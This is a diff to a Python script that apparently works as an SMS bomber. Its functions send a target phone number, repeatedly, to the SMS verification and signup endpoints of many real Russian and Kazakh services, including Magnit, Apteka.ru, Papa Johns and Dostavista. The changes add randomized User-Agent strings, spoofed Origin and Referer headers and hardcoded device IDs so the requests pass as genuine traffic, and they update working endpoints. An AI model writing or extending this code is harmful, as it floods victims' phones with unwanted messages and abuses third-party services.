@@ -161,11 +161,24 @@ def mm(number,n =1):
         else:
             return '⚠️ Магнит Маркет не отправлено'
 
+
+        
+ua = UserAgent()
+ 
+ 
 def rossko(number, n=1):
+    formatted = f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'
     for _ in range(n):
         r = post(
             'https://rossko.ru/customer/auth/',
-            data={'action': 'registerByPhone', 'realPhone': f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'}
+            headers={
+                'User-Agent': ua.random,
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://rossko.ru',
+                'Referer': 'https://rossko.ru/',
+            },
+            data={'action': 'registerByPhone', 'realPhone': formatted}
         )
         if r.status_code == 200:
             return '✅ Rossko отправлено'
@@ -175,10 +188,20 @@ def rossko(number, n=1):
  
  
 def apteka(number, n=1):
+    formatted = f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'
     for _ in range(n):
         r = post(
             'https://api.apteka.ru/Auth/Auth_Code',
-            json={'phone': f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'}
+            headers={
+                'User-Agent': ua.android,
+                'Accept': 'application/json',
+                'Accept-Charset': 'UTF-8',
+                'Content-Type': 'application/json',
+                'device-id': '93f6c4ce7f48cd1b',
+                'TZ': '-180',
+                'Interface': 'Light',
+            },
+            json={'phone': formatted}
         )
         if r.status_code == 200:
             return '✅ Apteka.ru отправлено'
@@ -191,6 +214,14 @@ def magnit(number, n=1):
     for _ in range(n):
         r = post(
             'https://id.magnit.ru/v3/auth/signin',
+            headers={
+                'User-Agent': ua.android,
+                'Accept': '*/*',
+                'Accept-Language': 'ru',
+                'Content-Type': 'application/json',
+                'Origin': 'https://magnit.ru',
+                'Referer': 'https://magnit.ru/',
+            },
             json={'phone': number[1:], 'device_id': '66d050cd8fd4e15a'}
         )
         if r.status_code == 200:
@@ -203,8 +234,18 @@ def magnit(number, n=1):
 def webbankir(number, n=1):
     for _ in range(n):
         r = post(
-            'https://ng-api.webbankir.com/api/auth/newCode/',
-            json={'phone': number}
+            'https://ng-api.webbankir.com/user/v2/phone_verification',
+            headers={
+                'User-Agent': ua.random,
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json; charset=utf-8',
+                'Origin': 'https://webbankir.com',
+                'Referer': 'https://webbankir.com/',
+            },
+            json={'data': {'type': 'PhoneVerification', 'attributes': {
+                'phone': number,
+                'webbankirCrossId': '8879b668-4734-4a47-97f0-c9af8b2acf94'
+            }}}
         )
         if r.status_code == 200:
             return '✅ Webbankir отправлено'
@@ -217,6 +258,13 @@ def chetire_lapy(number, n=1):
     for _ in range(n):
         r = post(
             'https://4lapy.ru/api/auth/newCode/',
+            headers={
+                'User-Agent': ua.random,
+                'Accept': '*/*',
+                'Content-Type': 'application/json; charset=utf-8',
+                'Origin': 'https://4lapy.ru',
+                'Referer': 'https://4lapy.ru/',
+            },
             json={'phone': number}
         )
         if r.status_code == 200:
@@ -229,26 +277,20 @@ def chetire_lapy(number, n=1):
 def papajohns(number, n=1):
     for _ in range(n):
         r = post(
-            'https://api.papajohns.ru/user/v2/phone_verification',
-            json={'data': {'type': 'PhoneVerification', 'attributes': {'phone': number, 'webbankirCrossId': '8879b668-4734-4a47-97f0-c9af8b2acf94'}}}
+            'https://api.papajohns.ru/v2/user/signup-by-phone',
+            headers={
+                'User-Agent': ua.random,
+                'Accept': 'application/json',
+                'Content-Type': 'application/json; charset=utf-8',
+                'Origin': 'https://papajohns.ru',
+                'Referer': 'https://papajohns.ru/',
+            },
+            json={'phone': f'+{number}', 'platform': 'web', 'city_id': '192', 'lang': 'ru'}
         )
         if r.status_code == 200:
             return '✅ Papa Johns отправлено'
         else:
             return '⚠️ Papa Johns не отправлено'
-        time.sleep(1)
- 
- 
-def papajohns_signup(number, n=1):
-    for _ in range(n):
-        r = post(
-            'https://api.papajohns.ru/v2/users',
-            json={'username': number, 'phone': number, 'app_version': 'v30'}
-        )
-        if r.status_code == 200:
-            return '✅ Papa Johns signup отправлено'
-        else:
-            return '⚠️ Papa Johns signup не отправлено'
         time.sleep(1)
  
  
@@ -258,6 +300,13 @@ def valta(number, n=1):
         r = post(
             'https://valta.ru/bitrix/services/main/ajax.php',
             params={'mode': 'class', 'c': 'citfact:register', 'action': 'sendSms'},
+            headers={
+                'User-Agent': ua.random,
+                'Accept': '*/*',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://valta.ru',
+                'Referer': 'https://valta.ru/register/current_client/person/private_zooservis/',
+            },
             data={'phone': formatted}
         )
         if r.status_code == 200:
@@ -272,6 +321,14 @@ def ecco(number, n=1):
     for _ in range(n):
         r = post(
             'https://ecco.ru/ajax/ajax.php',
+            headers={
+                'User-Agent': ua.random,
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://ecco.ru',
+                'Referer': 'https://ecco.ru/',
+                'X-Requested-With': 'XMLHttpRequest',
+            },
             data={
                 'ajax_event': 'set_auth_type',
                 'event': 'ajax',
@@ -290,9 +347,17 @@ def ecco(number, n=1):
  
 def viled(number, n=1):
     for _ in range(n):
-        r = post(
-            'https://api-prod.viled.kz/identityabo/anonymousFlow/init',
-            json={'phone': number[1:]}
+        r = get(
+            'https://api-prod.viled.kz/tizilimer/api/v1/users/sms',
+            params={'phone': number},
+            headers={
+                'User-Agent': ua.random,
+                'Accept': '*/*',
+                'Accept-Language': 'ru',
+                'Content-Type': 'application/json; charset=UTF-8',
+                'Origin': 'https://viled.kz',
+                'Referer': 'https://viled.kz/',
+            }
         )
         if r.status_code == 200:
             return '✅ Viled.kz отправлено'
@@ -301,10 +366,36 @@ def viled(number, n=1):
         time.sleep(1)
  
  
+def kino_1tv(number, n=1):
+    for _ in range(n):
+        r = get(
+            'https://api.kino.1tv.ru/1.4/sendUserCode',
+            params={'msisdn': number, 'mobile': 'false', 'client': 'web', 'referer': 'https://kino.1tv.ru/'},
+            headers={
+                'User-Agent': ua.random,
+                'Accept': '*/*',
+                'Origin': 'https://kino.1tv.ru',
+                'Referer': 'https://kino.1tv.ru/',
+            }
+        )
+        if r.status_code == 200:
+            return '✅ Кино 1ТВ отправлено'
+        else:
+            return '⚠️ Кино 1ТВ не отправлено'
+        time.sleep(1)
+ 
+ 
 def dostavista(number, n=1):
     for _ in range(n):
         r = post(
             'https://dostavista.ru/user/send-sms',
+            headers={
+                'User-Agent': ua.random,
+                'Accept': 'application/json',
+                'Content-Type': 'application/json; charset=utf-8',
+                'Origin': 'https://dostavista.ru',
+                'Referer': 'https://dostavista.ru/',
+            },
             json={'phone': number, 'source': 'signup'}
         )
         if r.status_code == 200:
@@ -318,6 +409,11 @@ def lifemart(number, n=1):
     for _ in range(n):
         r = post(
             'https://api.lifemart.ru/api/user/register',
+            headers={
+                'User-Agent': 'LifeMart/286 CFNetwork/3860.200.71 Darwin/25.1.0',
+                'Accept': '*/*',
+                'Content-Type': 'application/json; charset=utf-8',
+            },
             json={'verify_type': 'sms', 'phone': number[1:]}
         )
         if r.status_code == 200:
@@ -327,94 +423,15 @@ def lifemart(number, n=1):
         time.sleep(1)
  
  
-def igooods(number, n=1):
-    for _ in range(n):
-        r = post(
-            'https://igooods.ru/v2/otps',
-            json={'phone': number}
-        )
-        if r.status_code == 200:
-            return '✅ iGooods отправлено'
-        else:
-            return '⚠️ iGooods не отправлено'
-        time.sleep(1)
- 
- 
-def citydrive(number, n=1):
-    for _ in range(n):
-        r = post(
-            'https://citydrive.ru/signup',
-            params={'version': '21'},
-            json={
-                'os': 'web',
-                'phone': number[1:],
-                'phone_code': '7',
-                'vendor_id': 'f7bbe719-2356-465f-8858-da1218847e81'
-            }
-        )
-        if r.status_code == 200:
-            return '✅ CityDrive отправлено'
-        else:
-            return '⚠️ CityDrive не отправлено'
-        time.sleep(1)
- 
- 
-def bolshoe_tv(number, n=1):
-    for _ in range(n):
-        r = post(
-            'https://bolshoe.tv/v1/agregator/sendAuth',
-            json={'auth_type': 'phone', 'uid': number}
-        )
-        if r.status_code == 200:
-            return '✅ Bolshoe.tv отправлено'
-        else:
-            return '⚠️ Bolshoe.tv не отправлено'
-        time.sleep(1)
- 
- 
-def akbars(number, n=1):
-    for _ in range(n):
-        r = post(
-            'https://online.akbars.ru/identityabo/anonymousFlow/init',
-            json={'phone': number[1:]}
-        )
-        if r.status_code == 200:
-            return '✅ Akbars отправлено'
-        else:
-            return '⚠️ Akbars не отправлено'
-        time.sleep(1)
- 
- 
-def nskbl(number, n=1):
-    for _ in range(n):
-        r = post(
-            'https://www.nskbl.ru/api/ext/rshb-auth/send-verification-code-auth',
-            json={'login': f'+{number}'}
-        )
-        if r.status_code == 200:
-            return '✅ NSKBL отправлено'
-        else:
-            return '⚠️ NSKBL не отправлено'
-        time.sleep(1)
- 
- 
-def svoefermerstvo(number, n=1):
-    for _ in range(n):
-        r = post(
-            'https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth',
-            json={'login': f'+{number}'}
-        )
-        if r.status_code == 200:
-            return '✅ Своё Фермерство отправлено'
-        else:
-            return '⚠️ Своё Фермерство не отправлено'
-        time.sleep(1)
- 
- 
 def joy_money(number, n=1):
     for _ in range(n):
         r = post(
-            'https://my.joy.money/',
+            'https://my.joy.money/client-interface/authorize',
+            headers={
+                'User-Agent': ua.random,
+                'Content-Type': 'application/json; charset=utf-8',
+                'Accept': 'application/json',
+            },
             json={'phone': number, 'amount': '5500', 'days': '12'}
         )
         if r.status_code == 200:
@@ -422,13 +439,29 @@ def joy_money(number, n=1):
         else:
             return '⚠️ Joy Money не отправлено'
         time.sleep(1)
+ 
+ 
+def svoefermerstvo(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth',
+            headers={
+                'User-Agent': ua.random,
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json; charset=utf-8',
+                'Origin': 'https://svoefermerstvo.ru',
+                'Referer': 'https://svoefermerstvo.ru/auth',
+            },
+            json={'login': f'+{number}'}
+        )
+        if r.status_code == 200:
+            return '✅ Своё Фермерство отправлено'
+        else:
+            return '⚠️ Своё Фермерство не отправлено'
+        time.sleep(1)
+    
 
-ALL = [
-    rossko, apteka, magnit, webbankir, chetire_lapy,
-    papajohns, papajohns_signup, valta, ecco, viled,
-    dostavista, lifemart, igooods, citydrive, bolshoe_tv,
-    akbars, nskbl, svoefermerstvo, joy_money
-]
+     
 
 
 
